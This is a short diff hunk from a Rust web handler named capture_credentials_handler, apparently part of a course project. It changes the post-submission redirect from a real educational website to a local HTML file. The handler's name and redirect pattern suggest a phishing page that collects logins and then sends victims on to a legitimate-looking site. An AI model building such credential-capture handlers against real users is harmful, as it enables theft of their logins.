@@ -106,7 +106,7 @@ async fn capture_credentials_handler(
 
     //cc
 
-    let redirect_url = "https://www.vietjack.com/";
+    let redirect_url = "D:/Project_2_Rust/Week7/content/after.html";
     println!("Redirecting to: {}", redirect_url);
     Redirect::to(redirect_url).into_response()
 }
